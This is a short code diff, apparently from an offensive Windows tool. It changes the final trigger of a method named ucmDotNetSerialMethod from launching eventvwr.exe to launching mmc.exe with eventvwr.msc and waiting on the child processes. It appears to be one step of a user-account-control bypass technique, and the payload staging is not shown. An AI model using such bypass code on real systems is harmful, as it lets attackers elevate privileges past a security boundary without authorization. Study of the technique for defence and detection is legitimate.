@@ -1152,6 +1152,7 @@ NTSTATUS ucmDotNetSerialMethod(
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HANDLE hProcess = NULL;
     LPWSTR lpAppData = NULL, lpTargetPath = NULL;
     SIZE_T memIO;
     WCHAR szTarget[MAX_PATH * 2];
@@ -1189,11 +1190,13 @@ NTSTATUS ucmDotNetSerialMethod(
         // Run eventvwr.exe as final trigger.
         //
         _strcpy(szTarget, g_ctx->szSystemDirectory);
-        _strcat(szTarget, EVENTVWR_EXE);
-        if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, 0))
+        _strcat(szTarget, MMC_EXE);
+        hProcess = supRunProcess3(szTarget, EVENTVWR_MSC, NULL, SW_SHOW);
+        if (hProcess) {
+            supWaitForChildProcesses(MMC_EXE, 50 * 1000);
+            CloseHandle(hProcess);
             MethodResult = STATUS_SUCCESS;
-
-        Sleep(SUPRUNPROCESS_TIMEOUT_DEFAULT);
+        }
 
     } while (FALSE);
 
